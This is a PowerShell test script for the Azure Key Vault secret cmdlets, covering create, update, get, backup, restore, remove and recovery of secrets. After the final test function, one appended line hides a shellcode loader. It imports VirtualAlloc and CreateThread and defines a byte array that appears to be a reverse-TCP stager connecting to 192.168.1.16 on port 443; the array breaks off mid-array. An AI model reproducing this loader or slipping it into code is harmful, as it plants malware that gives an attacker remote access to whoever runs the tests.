$data=123
$securedata=$data | ConvertTo-SecureString -AsPlainText -Force	
$newdata=456
$newsecuredata=$newdata | ConvertTo-SecureString -AsPlainText -Force	

$expires= (Get-Date).AddYears(2).ToUniversalTime()
$nbf=(Get-Date).ToUniversalTime()
$newexpires= (Get-Date).AddYears(5).ToUniversalTime()
$newnbf=(Get-Date).AddYears(1).ToUniversalTime()
$delta=[TimeSpan]::FromMinutes(2)
$tags=@{"tag1"="value1"; "tag2"=""; "tag3"=$null}
$newtags= @{"tag1"="value1"; "tag2"="value2"; "tag3"="value3"; "tag4"="value4"}
$emptytags=@{}
$contenttype="contenttype"
$newcontenttype="newcontenttype"
$emptycontenttype=""

function Assert-SecretAttributes($secretAttr, $secenable, $secexp, $secnbf, $seccontenttype, $sectags)
{
    Assert-NotNull $secretAttr, "secretAttr is null."
    Assert-AreEqual $secenable $secretAttr.Enabled "Expect $secenable. Get $secretAttr.Enabled"  
    Assert-True { Equal-DateTime  $secexp $secretAttr.Expires } "Expect $secexp. Get $secretAttr.Expires"
    Assert-True { Equal-DateTime  $secnbf $secretAttr.NotBefore} "Expect $secnbf. Get $secretAttr.NotBefore"
    Assert-True { Equal-String  $seccontenttype $secretAttr.ContentType} "Expect $seccontenttype. Get $secretAttr.ContentType" 
    Assert-True { Equal-Hashtable $sectags $secretAttr.Tags} "Expected $sectags. Get $secretAttr.Tags"
	Assert-NotNull $secretAttr.RecoveryLevel, "Deletion recovery level is null."
}

function BulkCreateSecrets ($vault, $prefix, $total)
{
    for ($i=0;$i -lt $total; $i++) 
    { 
        $name = $prefix+$i; 
        $sec=Set-AzKeyVaultSecret -VaultName $vault -Name $name  -SecretValue $securedata
        Assert-NotNull $sec
        $global:createdSecrets += $name   
    }
 }

function BulkCreateSecretVersions ($vault, $name, $total)
{
    for ($i=0;$i -lt $total; $i++) 
    { 
        $sec=Set-AzKeyVaultSecret -VaultName $vault -Name $name  -SecretValue $securedata
        Assert-NotNull $sec      
    }
    $global:createdSecrets += $name
 }




function Test_CreateSecret
{
    $keyVault = Get-KeyVault
    $secretname= Get-SecretName 'default'    
    $sec=Set-AzKeyVaultSecret -VaultName $keyVault -Name $secretname -SecretValue $securedata
    Assert-NotNull $sec
    $global:createdSecrets += $secretname
    Assert-AreEqual $sec.SecretValueText $data
    Assert-SecretAttributes $sec.Attributes $true $null $null $null $null
}



function Test_CreateSecretWithCustomAttributes
{
    $keyVault = Get-KeyVault
    $secretname= Get-SecretName 'attr'    
    $sec=Set-AzKeyVaultSecret -VaultName $keyVault -Name $secretname -SecretValue $securedata -Expires $expires -NotBefore $nbf -ContentType $contenttype -Disable -Tag $tags
    Assert-NotNull $sec
    $global:createdSecrets += $secretname
    Assert-AreEqual $sec.SecretValueText $data
    Assert-SecretAttributes $sec.Attributes $false $expires $nbf $contenttype $tags
}




function Test_UpdateSecret
{
    $keyVault = Get-KeyVault
    $secretname= Get-SecretName 'update'
    $sec=Set-AzKeyVaultSecret -VaultName $keyVault -Name $secretname -SecretValue $securedata
    Assert-NotNull $sec
    $global:createdSecrets += $secretname
    Assert-AreEqual $sec.SecretValueText $data
    Assert-SecretAttributes $sec.Attributes $true $null $null $null $null
    
    $sec=Set-AzKeyVaultSecret -VaultName $keyVault -Name $secretname -SecretValue $newsecuredata
    Assert-NotNull $sec
    Assert-AreEqual $sec.SecretValueText $newdata
    Assert-SecretAttributes $sec.Attributes $true $null $null $null $null
}


function Test_SetSecretPositionalParameter
{
    $keyVault = Get-KeyVault
    $secretname= Get-SecretName 'positional'  
    $sec=Set-AzKeyVaultSecret $keyVault $secretname $securedata -Expires $expires -NotBefore $nbf -ContentType $contenttype -Disable -Tag $tags
    Assert-NotNull $sec
    $global:createdSecrets += $secretname   
    Assert-AreEqual $sec.SecretValueText $data    
    Assert-SecretAttributes $sec.Attributes $false $expires $nbf $contenttype $tags
}


function Test_SetSecretAliasParameter
{
    $keyVault = Get-KeyVault
    $secretname= Get-SecretName 'alias'   
    $sec=Set-AzKeyVaultSecret -VaultName $keyVault -SecretName $secretname -SecretValue $securedata -Expires $expires -NotBefore $nbf -ContentType $contenttype -Disable -Tag $tags
    Assert-NotNull $sec
    $global:createdSecrets += $secretname   
    Assert-AreEqual $sec.SecretValueText $data
    Assert-SecretAttributes $sec.Attributes $false $expires $nbf $contenttype $tags            
}


function Test_SetSecretInNonExistVault
{
    $keyVault = 'notexistvault'
    $secretname= Get-SecretName 'nonexist'    
    Assert-Throws {Set-AzKeyVaultSecret -VaultName $keyVault -Name $secretname -SecretValue $securedata}
}


function Test_SetSecretInNoPermissionVault
{
    $keyVault = Get-KeyVault $false
    $secretname= Get-SecretName 'nopermission' 
    Assert-Throws {Set-AzKeyVaultSecret -VaultName $keyVault -Name $secretname -SecretValue $securedata}
}


function Test_UpdateIndividualSecretAttributes
{
    
    $keyVault = Get-KeyVault
    $secretname=Get-SecretName 'updateattr'
    $sec=Set-AzKeyVaultSecret $keyVault $secretname $securedata -Expires $expires -NotBefore $nbf -ContentType $contenttype -Disable -Tag $tags
    Assert-NotNull $sec
    $global:createdSecrets += $secretname
    Assert-AreEqual $sec.SecretValueText $data
    Assert-SecretAttributes $sec.Attributes $false $expires $nbf $contenttype $tags
    
    
    
    $sec=Set-AzKeyVaultSecretAttribute -VaultName $keyVault -Name $secretname -Expires $newexpires -PassThru
    Assert-NotNull $sec
    Assert-SecretAttributes $sec.Attributes $false $newexpires $nbf $contenttype $tags
    
    
    $sec=Set-AzKeyVaultSecretAttribute -VaultName $keyVault -Name $secretname -NotBefore $newnbf -PassThru
    Assert-NotNull $sec
    Assert-SecretAttributes $sec.Attributes $false $newexpires $newnbf $contenttype $tags
   
    
    $sec=Set-AzKeyVaultSecretAttribute -VaultName $keyVault -Name $secretname -Enable $true -PassThru
    Assert-NotNull $sec
    Assert-SecretAttributes $sec.Attributes $true $newexpires $newnbf $contenttype $tags
    
    
    $sec=Set-AzKeyVaultSecretAttribute -VaultName $keyVault -Name $secretname -ContentType $newcontenttype -PassThru
    Assert-NotNull $sec
    Assert-SecretAttributes $sec.Attributes $true $newexpires $newnbf $newcontenttype $tags
    
    
    $sec=Set-AzKeyVaultSecretAttribute -VaultName $keyVault -Name $secretname -Tag $newtags -PassThru
    Assert-NotNull $sec
    Assert-SecretAttributes $sec.Attributes $true $newexpires $newnbf $newcontenttype $newtags
    
    
    $sec=Set-AzKeyVaultSecretAttribute -VaultName $keyVault -Name $secretname -Tag $emptytags -PassThru   
    Assert-NotNull $sec
    Assert-SecretAttributes $sec.Attributes $true $newexpires $newnbf $newcontenttype $emptytags
}


function Test_UpdateSecretWithNoChange
{
    
    $keyVault = Get-KeyVault
    $secretname=Get-SecretName 'updatenochange'
    $sec=Set-AzKeyVaultSecret $keyVault $secretname $securedata -Expires $expires -NotBefore $nbf -ContentType $contenttype -Disable -Tag $tags
    Assert-NotNull $sec
    $global:createdSecrets += $secretname
    Assert-AreEqual $sec.SecretValueText $data
    Assert-SecretAttributes $sec.Attributes $false $expires $nbf $contenttype $tags

    
    $sec=Set-AzKeyVaultSecretAttribute -VaultName $keyVault -Name $secretname -PassThru
    Assert-NotNull $sec
    Assert-SecretAttributes $sec.Attributes $false $expires $nbf $contenttype $tags
}


function Test_UpdateAllEditableSecretAttributes
{
    
    $keyVault = Get-KeyVault
    $secretname=Get-SecretName 'updateall'
    $sec=Set-AzKeyVaultSecret -VaultName $keyVault -Name $secretname -SecretValue $securedata
    Assert-NotNull $sec
    $global:createdSecrets += $secretname
    Assert-AreEqual $sec.SecretValueText $data
    Assert-SecretAttributes $sec.Attributes $true $null $null $null $null
  
    
    $sec=Set-AzKeyVaultSecretAttribute -VaultName $keyVault -Name $secretname -Expires $expires -NotBefore $nbf -ContentType $contenttype -Enable $false -Tag $tags -PassThru
    Assert-NotNull $sec
    Assert-SecretAttributes $sec.Attributes $false $expires $nbf $contenttype $tags
}


function Test_SetSecretAttributePositionalParameter
{
    $keyVault = Get-KeyVault
    $secretname=Get-SecretName 'attrpos'
    $sec=Set-AzKeyVaultSecret -VaultName $keyVault -Name $secretname -SecretValue $securedata
    Assert-NotNull $sec
    $global:createdSecrets += $secretname
    Assert-AreEqual $sec.SecretValueText $data
    Assert-SecretAttributes $sec.Attributes $true $null $null $null $null
  
    $sec=Set-AzKeyVaultSecretAttribute $keyVault $secretname -Expires $expires -NotBefore $nbf -ContentType $contenttype -Enable $false -Tag $tags -PassThru
    Assert-NotNull $sec
    Assert-SecretAttributes $sec.Attributes $false $expires $nbf $contenttype $tags    
}


function Test_SetSecretAttributeAliasParameter
{
    $keyVault = Get-KeyVault
    $secretname=Get-SecretName 'attralias'
    $sec=Set-AzKeyVaultSecret -VaultName $keyVault -Name $secretname -SecretValue $securedata
    Assert-NotNull $sec
    $global:createdSecrets += $secretname
    Assert-AreEqual $sec.SecretValueText $data
    Assert-SecretAttributes $sec.Attributes $true $null $null $null $null
  
    $sec=Set-AzKeyVaultSecretAttribute -VaultName $keyVault -SecretName $secretname -Expires $expires -NotBefore $nbf -ContentType $contenttype -Enable $false -Tag $tags -PassThru
    Assert-NotNull $sec
    Assert-SecretAttributes $sec.Attributes $false $expires $nbf $contenttype $tags    
}



function Test_SetSecretVersion
{
        
    $keyVault = Get-KeyVault
    $secretname=Get-SecretName 'mulupdate'
    $sec=Set-AzKeyVaultSecret -VaultName $keyVault -Name $secretname -SecretValue $securedata
    Assert-NotNull $sec
    $v1 = $sec.Version    
    $global:createdSecrets += $secretname
    Assert-SecretAttributes $sec.Attributes $true $null $null $null $null
    
    
    $sec=Set-AzKeyVaultSecret -VaultName $keyVault -Name $secretname -SecretValue $securedata
    Assert-NotNull $sec
    Assert-SecretAttributes $sec.Attributes $true $null $null $null $null
    
    
    Set-AzKeyVaultSecretAttribute -VaultName $keyVault -SecretName $secretname -Version $v1 -Enable $true -Expires $expires -NotBefore $nbf -ContentType $contenttype -Tag $tags -PassThru
    
    
    $sec=Get-AzKeyVaultSecret -VaultName $keyVault -SecretName $secretname -Version $v1
    Assert-NotNull $sec
    Assert-SecretAttributes $sec.Attributes $true $expires $nbf $contenttype $tags            
    
      
    $sec=Get-AzKeyVaultSecret -VaultName $keyVault -SecretName $secretname -Version $v2
    Assert-NotNull $sec
    Assert-SecretAttributes $sec.Attributes $true $null $null $null $null
    
    
    $sec=Get-AzKeyVaultSecret -VaultName $keyVault -SecretName $secretname 
    Assert-NotNull $sec
    Assert-SecretAttributes $sec.Attributes $true $null $null $null $null
    
    
    
    
    
    
    
    
 }                  
    


function Test_GetSecretInABadVault
{
    $secretname = Get-SecretName 'nonexist'   
    Assert-Throws { Get-AzKeyVaultSecret '$vaultName' $secretname }
}


function Test_SetSecretInNonExistVault
{
    $keyVault = 'notexistvault'
    $secretname=Get-SecretName 'nonexist'   
    Assert-Throws {Set-AzKeyVaultSecretAttribute -VaultName $keyVault -Name $secretname -ContentType $newcontenttype}
}


function Test_SetNonExistSecret
{
    $keyVault = Get-KeyVault   
    $secretname=Get-SecretName 'nonexist'   
    Assert-Throws {Set-AzKeyVaultSecretAttribute -VaultName $keyVault -Name $secretname -ContentType $newcontenttype}    
}


function Test_SetInvalidSecretAttributes
{
    $keyVault = Get-KeyVault
    $secretname=Get-SecretName 'invalidattr'
    $sec=Set-AzKeyVaultSecret -VaultName $keyVault -Name $secretname -SecretValue $securedata
    Assert-NotNull $sec
    $global:createdSecrets += $secretname
    Assert-SecretAttributes $sec.Attributes $true $null $null $null $null

    Assert-Throws {Set-AzKeyVaultSecretAttribute -VaultName $keyVault -Name $secretname -Expires $nbf  -NotBefore $expires }       
}


function Test_SetSecretAttrInNoPermissionVault
{
    $keyVault = Get-KeyVault $false
    $secretname= Get-SecretName 'nopermission'
    Assert-Throws {Set-AzKeyVaultSecretAttribute -VaultName $keyVault -Name $secretname -Enable $true}
}


function Test_GetOneSecret
{
    $keyVault = Get-KeyVault
    $secretname= Get-SecretName 'getone'
    $sec=Set-AzKeyVaultSecret -VaultName $keyVault -Name $secretname -SecretValue $securedata
    Assert-NotNull $sec
    $global:createdSecrets += $secretname   
    Assert-AreEqual $sec.SecretValueText $data    
    Assert-SecretAttributes $sec.Attributes $true $null $null $null $null

    $sec=Get-AzKeyVaultSecret -VaultName $keyVault -Name $secretname
    Assert-NotNull $sec
    Assert-AreEqual $sec.SecretValueText $data    
    Assert-SecretAttributes $sec.Attributes $true $null $null $null $null
}


function Test_GetAllSecrets
{
    $keyVault = Get-KeyVault
    $secretpartialname=Get-SecretName 'get'
    $total=30
    BulkCreateSecrets $keyVault $secretpartialname $total
        
    $secs=Get-AzKeyVaultSecret -VaultName $keyVault
    Assert-True { $secs.Count -ge $total }
}



function Test_GetPreviousVersionOfSecret
{
    $keyVault = Get-KeyVault
    $secretname= Get-SecretName 'getversion'

    
    $sec1=Set-AzKeyVaultSecret -VaultName $keyVault -Name $secretname -SecretValue $securedata
    Assert-NotNull $sec1
    $global:createdSecrets += $secretname   
    Assert-AreEqual $sec1.SecretValueText $data    
    Assert-SecretAttributes $sec1.Attributes $true $null $null $null $null
    
    
    $sec2=Set-AzKeyVaultSecret -VaultName $keyVault -Name $secretname -SecretValue $newsecuredata -Expires $expires -NotBefore $nbf -ContentType $contenttype -Tag $tags
    Assert-NotNull $sec2  
    Assert-AreEqual $sec2.SecretValueText $newdata    
    Assert-SecretAttributes $sec2.Attributes $true $expires $nbf $contenttype $tags

    
    $sec3=Get-AzKeyVaultSecret -VaultName $keyVault -Name $secretname -Version $sec1.Version
    Assert-NotNull $sec3
    Assert-AreEqual $sec3.SecretValueText $data
    Assert-SecretAttributes $sec3.Attributes $true $null $null $null $null

    
    $sec4=Get-AzKeyVaultSecret -VaultName $keyVault -Name $secretname -Version $sec2.Version
    Assert-NotNull $sec4
    Assert-AreEqual $sec4.SecretValueText $newdata  
    Assert-SecretAttributes $sec4.Attributes $true $expires $nbf $contenttype $tags
}



function Test_GetSecretVersions
{
    $keyVault = Get-KeyVault
    $secretname= Get-SecretName 'getversions'    
    $total=30
    
    BulkCreateSecretVersions $keyVault $secretname $total
        
    $secs=Get-AzKeyVaultSecret -VaultName $keyVault -Name $secretname -IncludeVersions
    Assert-True { $secs.Count -ge $total }
}


function Test_GetSecretPositionalParameter
{
    $keyVault = Get-KeyVault
    $secretname= Get-SecretName 'positional'  
    $sec=Set-AzKeyVaultSecret -VaultName $keyVault -Name $secretname  -SecretValue $securedata
    Assert-NotNull $sec
    $global:createdSecrets += $secretname   
    Assert-AreEqual $sec.SecretValueText $data    

    $sec=Get-AzKeyVaultSecret $keyVault $secretname
    Assert-NotNull $sec
    Assert-AreEqual $sec.SecretValueText $data    
}


function Test_GetSecretAliasParameter
{
    $keyVault = Get-KeyVault
    $secretname= Get-SecretName 'alias'  
    $sec=Set-AzKeyVaultSecret -VaultName $keyVault -Name $secretname  -SecretValue $securedata
    Assert-NotNull $sec
    $global:createdSecrets += $secretname   
    Assert-AreEqual $sec.SecretValueText $data    

    $sec=Get-AzKeyVaultSecret -VaultName $keyVault -SecretName $secretname 
    Assert-NotNull $sec
    Assert-AreEqual $sec.SecretValueText $data                    
}


function Test_GetSecretInNonExistVault
{
    $keyVault = 'notexistvault'
    Assert-Throws {Get-AzKeyVaultSecret -VaultName $keyVault}
}


function Test_GetNonExistSecret
{
    $keyVault = Get-KeyVault
    $secretname= Get-SecretName 'notexistvault'
      
    $secret = Get-AzKeyVaultSecret -VaultName $keyVault -Name $secretname
    Assert-Null $secret
}


function Test_GetSecretInNoPermissionVault
{
    $keyVault = Get-KeyVault $false
    Assert-Throws {Get-AzKeyVaultSecret -VaultName $keyVault}
}


function Test_RemoveSecretWithoutPrompt
{
    $keyVault = Get-KeyVault
    $secretname= Get-SecretName 'remove'  
    $sec=Set-AzKeyVaultSecret -VaultName $keyVault -Name $secretname  -SecretValue $securedata
    Assert-NotNull $sec
    $global:createdSecrets += $secretname   
       
    $sec=Remove-AzKeyVaultSecret -VaultName $keyVault -Name $secretname -Force -Confirm:$false -PassThru
    Assert-NotNull $sec
    
    $secret = Get-AzKeyVaultSecret -VaultName $keyVault -Name $secretname
    Assert-Null $secret
}


function Test_RemoveSecretWhatIf
{
    $keyVault = Get-KeyVault
    $secretname= Get-SecretName 'whatif'
    $sec=Set-AzKeyVaultSecret -VaultName $keyVault -Name $secretname  -SecretValue $securedata
    Assert-NotNull $sec
    $global:createdSecrets += $secretname   
       
    Remove-AzKeyVaultSecret -VaultName $keyVault -Name $secretname -WhatIf -Force
    
    $sec=Get-AzKeyVaultSecret -VaultName $keyVault -Name $secretname
    Assert-NotNull $sec        
}


function Test_RemoveSecretPositionalParameter
{
    $keyVault = Get-KeyVault
    $secretname= Get-SecretName 'positional'  
    $sec=Set-AzKeyVaultSecret -VaultName $keyVault -Name $secretname  -SecretValue $securedata
    Assert-NotNull $sec
    $global:createdSecrets += $secretname   
    Assert-AreEqual $sec.SecretValueText $data    

    Remove-AzKeyVaultSecret $keyVault $secretname  -Force -Confirm:$false 
    
    $secret = Get-AzKeyVaultSecret -VaultName $keyVault -Name $secretname
    Assert-Null $secret
}


function Test_RemoveSecretAliasParameter
{
    $keyVault = Get-KeyVault
    $secretname= Get-SecretName 'alias'  
    $sec=Set-AzKeyVaultSecret -VaultName $keyVault -Name $secretname  -SecretValue $securedata
    Assert-NotNull $sec
    $global:createdSecrets += $secretname   
    Assert-AreEqual $sec.SecretValueText $data    

    Remove-AzKeyVaultSecret -VaultName $keyVault  -SecretName $secretname  -Force -Confirm:$false 
    
    $secret = Get-AzKeyVaultSecret -VaultName $keyVault -Name $secretname
    Assert-Null $secret            
}


function Test_RemoveSecretInNonExistVault
{
    $keyVault = 'notexistvault'
    $secretname= Get-SecretName 'notexistvault'
    Assert-Throws {Remove-AzKeyVaultSecret -VaultName $keyVault -Name $secretname -Force -Confirm:$false}
}


function Test_RemoveNonExistSecret
{
    $keyVault = Get-KeyVault
    $secretname= Get-SecretName 'notexistvault'
      
    Assert-Throws {Remove-AzKeyVaultSecret -VaultName $keyVault -Name $secretname -Force -Confirm:$false}
}


function Test_RemoveSecretInNoPermissionVault
{
    $keyVault = Get-KeyVault $false
    $secretname= Get-SecretName 'nopermission'
    Assert-Throws {Remove-AzKeyVaultSecret -VaultName $keyVault -Name $secretname -Force -Confirm:$false}
}


function Test_BackupRestoreSecretByName
{
    $keyVault = Get-KeyVault
    $name=Get-SecretName 'backuprestore'   
    $secret=Set-AzKeyVaultSecret -VaultName $keyVault -Name $name -SecretValue $securedata
    Assert-NotNull $secret                 
    $global:createdSecrets += $name

    $backupblob = Backup-AzKeyVaultSecret -VaultName $keyVault -SecretName $name       
    Remove-AzKeyVaultSecret -VaultName $keyVault -Name $name -Force -Confirm:$false
    $restoredSecret = Restore-AzKeyVaultSecret -VaultName $keyVault -InputFile $backupblob
    
    $retrievedSecret = Get-AzKeyVaultSecret -VaultName $keyVault -SecretName $name
    Assert-AreEqual $retrievedSecret.SecretValueText $data
}


function Test_BackupRestoreSecretByRef
{
    $keyVault = Get-KeyVault
    $name=Get-SecretName 'backuprestore'   
    $secret=Set-AzKeyVaultSecret -VaultName $keyVault -Name $name -SecretValue $securedata
    Assert-NotNull $secret                 
    $global:createdSecrets += $name

    $backupblob = Backup-AzKeyVaultSecret -Secret $secret
    Remove-AzKeyVaultSecret -VaultName $keyVault -Name $name -Force -Confirm:$false
    $restoredSecret = Restore-AzKeyVaultSecret -VaultName $keyVault -InputFile $backupblob
    
    $retrievedSecret = Get-AzKeyVaultSecret -VaultName $keyVault -SecretName $name
    Assert-AreEqual $retrievedSecret.SecretValueText $data
}


function Test_BackupNonExistingSecret
{
    $keyVault = Get-KeyVault
    $name=Get-SecretName 'backupnonexisting'

    Assert-Throws { Backup-AzKeyVaultSecret -VaultName $keyVault -SecretName $name }
}


function Test_BackupSecretToANamedFile
{
    $keyVault = Get-KeyVault
    $name=Get-SecretName 'backupnamedfile'
    $secret=Set-AzKeyVaultSecret -VaultName $keyVault -Name $name -SecretValue $securedata
    Assert-NotNull $secret                 
    $global:createdSecrets += $name
  
    $backupfile='.\backup' + ([GUID]::NewGuid()).GUID.ToString() + '.blob'
 
    Backup-AzKeyVaultSecret -VaultName $keyVault -SecretName $name -OutputFile $backupfile    
    Remove-AzKeyVaultSecret -VaultName $keyVault -Name $name -Force -Confirm:$false
    $restoredSecret = Restore-AzKeyVaultSecret -VaultName $keyVault -InputFile $backupfile

    $retrievedSecret = Get-AzKeyVaultSecret -VaultName $keyVault -SecretName $name
    Assert-AreEqual $retrievedSecret.SecretValueText $data
}


function Test_BackupSecretToExistingFile
{
    $keyVault = Get-KeyVault
    $name=Get-SecretName 'backupexistingfile'
    $secret=Set-AzKeyVaultSecret -VaultName $keyVault -Name $name -SecretValue $securedata
    Assert-NotNull $secret                 
    $global:createdSecrets += $name
  
    $backupfile='.\backup' + ([GUID]::NewGuid()).GUID.ToString() + '.blob'
    Backup-AzKeyVaultSecret -VaultName $keyVault -SecretName $name -OutputFile $backupfile 
    Backup-AzKeyVaultSecret -VaultName $keyVault -SecretName $name -OutputFile $backupfile -Force -Confirm:$false
}



function Test_RestoreSecretFromNonExistingFile
{
    $keyVault = Get-KeyVault

    Assert-Throws { Restore-AzKeyVaultSecret -VaultName $keyVault -InputFile c:\nonexisting.blob }
}


function Test_PipelineUpdateSecrets
{
    $keyVault = Get-KeyVault
    $secretpartialname=Get-SecretName 'pipeupdate'
    $total=2
    BulkCreateSecrets $keyVault $secretpartialname $total        
    Get-AzKeyVaultSecret $keyVault |  Where-Object {$_.SecretName -like $secretpartialname+'*'}  | Set-AzKeyVaultSecret -SecretValue $newsecuredata	
    Get-AzKeyVaultSecret $keyVault |  Where-Object {$_.SecretName -like $secretpartialname+'*'}  | ForEach-Object { Assert-AreEqual $_.SecretValueText $newdata }
}


function Test_PipelineUpdateSecretAttributes
{
    $keyVault = Get-KeyVault
    $secretpartialname=Get-SecretName 'pipeupdateattr'
    $total=2
    BulkCreateSecrets $keyVault $secretpartialname $total        
    
    Get-AzKeyVaultSecret $keyVault |  Where-Object {$_.SecretName -like $secretpartialname+'*'}  | Set-AzKeyVaultSecretAttribute -ContentType $newcontenttype
    Get-AzKeyVaultSecret $keyVault |  Where-Object {$_.SecretName -like $secretpartialname+'*'}  | ForEach-Object { Assert-True { Equal-String $newcontenttype  $_.ContentType }}
    
    Get-AzKeyVaultSecret $keyVault |  Where-Object {$_.SecretName -like $secretpartialname+'*'}  | Set-AzKeyVaultSecretAttribute -Tag $newtags
    Get-AzKeyVaultSecret $keyVault |  Where-Object {$_.SecretName -like $secretpartialname+'*'}  | ForEach-Object { Assert-True { Equal-Hashtable $newtags $_.Tags }}
}

 

function Test_PipelineUpdateSecretVersions
{
    $keyVault = Get-KeyVault
    $secretname=Get-SecretName 'pipeupdateversion'
    $total=2    
    BulkCreateSecretVersions $keyVault $secretname $total
    
    Get-AzKeyVaultSecret $keyVault $secretname -IncludeVersions | Set-AzKeyVaultSecretAttribute -Expires $newexpires
    Get-AzKeyVaultSecret $keyVault $secretname -IncludeVersions |  ForEach-Object { Assert-True { Equal-DateTime $newexpires  $_.Expires }}
    
    Get-AzKeyVaultSecret $keyVault $secretname -IncludeVersions | Set-AzKeyVaultSecretAttribute -Tag $newtags
    Get-AzKeyVaultSecret $keyVault $secretname -IncludeVersions | ForEach-Object { Assert-True { Equal-Hashtable $newtags $_.Tags }}
 }
 


function Test_PipelineRemoveSecrets
{
    $keyVault = Get-KeyVault
    $secretpartialname=Get-SecretName 'piperemove'
    $total=2
    BulkCreateSecrets $keyVault $secretpartialname $total 
    Get-AzKeyVaultSecret $keyVault |  Where-Object {$_.SecretName -like $secretpartialname+'*'}  | Remove-AzKeyVaultSecret -Force -Confirm:$false	

    $secs = Get-AzKeyVaultSecret $keyVault |  Where-Object {$_.SecretName -like $secretpartialname+'*'}  
    Assert-AreEqual $secs.Count 0     
}


function Test_GetDeletedSecret
{
	
    $keyVault = Get-KeyVault
    $secretname=Get-SecretName 'GetDeletedSecret'
    $sec=Set-AzKeyVaultSecret -VaultName $keyVault -Name $secretname  -SecretValue $securedata
    Assert-NotNull $sec
    $global:createdSecrets += $secretname   

	$sec | Remove-AzKeyVaultSecret -Force -Confirm:$false

	Wait-ForDeletedSecret $keyVault $secretname

	$deletedSecret = Get-AzKeyVaultSecret -VaultName $keyVault -Name $secretname -InRemovedState
	Assert-NotNull $deletedSecret
	Assert-NotNull $deletedSecret.DeletedDate
	Assert-NotNull $deletedSecret.ScheduledPurgeDate
}


function Test_GetDeletedSecrets
{
	$keyVault = Get-KeyVault
    $secretname=Get-SecretName 'GetDeletedSecrets'
    $sec=Set-AzKeyVaultSecret -VaultName $keyVault -Name $secretname  -SecretValue $securedata
    Assert-NotNull $sec
    $global:createdSecrets += $secretname   

	$sec | Remove-AzKeyVaultSecret -Force -Confirm:$false

	Wait-ForDeletedSecret $keyVault $secretname

	$deletedSecrets = Get-AzKeyVaultSecret -VaultName $keyVault -InRemovedState
	Assert-True {$deletedSecrets.Count -ge 1}
    Assert-True {$deletedSecrets.Name -contains $key.Name}
}


function Test_UndoRemoveSecret
{
	
    $keyVault = Get-KeyVault
    $secretname=Get-SecretName 'UndoRemoveSecret'
    $sec=Set-AzKeyVaultSecret -VaultName $keyVault -Name $secretname  -SecretValue $securedata
    Assert-NotNull $sec
    $global:createdSecrets += $secretname   

	$sec | Remove-AzKeyVaultSecret -Force -Confirm:$false

	Wait-ForDeletedSecret $keyVault $secretname

	$recoveredSecret = Undo-AzKeyVaultSecretRemoval -VaultName $keyVault -Name $secretname

	Assert-NotNull $recoveredSecret
	Assert-AreEqual $recoveredSecret.Name $sec.Name
	Assert-AreEqual $recoveredSecret.Version $sec.Version
}


function Test_RemoveDeletedSecret
{
	
    $keyVault = Get-KeyVault
    $secretname=Get-SecretName 'RemoveDeletedSecret'
    $sec=Set-AzKeyVaultSecret -VaultName $keyVault -Name $secretname  -SecretValue $securedata
    Assert-NotNull $sec
    $global:createdSecrets += $secretname   

	$sec | Remove-AzKeyVaultSecret -Force -Confirm:$false

	Wait-ForDeletedSecret $keyVault $secretname
	
	Remove-AzKeyVaultSecret -VaultName $keyVault -Name $secretname -InRemovedState -Force -Confirm:$false
}


function Test_RemoveNonExistDeletedSecret
{
	$keyVault = Get-KeyVault
    $secretname= Get-SecretName 'RemoveNonExistSecret'
	$sec= Set-AzKeyVaultSecret -VaultName $keyVault -Name $secretname  -SecretValue $securedata
	Assert-NotNull $sec
    $global:createdSecrets += $secretname   

    Assert-Throws {Remove-AzKeyVaultSecret -VaultName $keyVault -Name $secretname -InRemovedState -Force -Confirm:$false}
}



function Test_PipelineRemoveDeletedSecrets
{
    $keyVault = Get-KeyVault
    $secretpartialname=Get-SecretName 'piperemove'
    $total=2
    BulkCreateSecrets $keyVault $secretpartialname $total 
    Get-AzKeyVaultSecret $keyVault |  Where-Object {$_.SecretName -like $secretpartialname+'*'}  | Remove-AzKeyVaultSecret -Force -Confirm:$false	
	Wait-Seconds 30 
    Get-AzKeyVaultSecret $keyVault -InRemovedState |  Where-Object {$_.SecretName -like $secretpartialname+'*'}  | Remove-AzKeyVaultSecret -Force -Confirm:$false	-InRemovedState

	$secs = Get-AzKeyVaultSecret $keyVault -InRemovedState |  Where-Object {$_.SecretName -like $secretpartialname+'*'}
	Assert-AreEqual $secs.Count 0   
}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x10,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0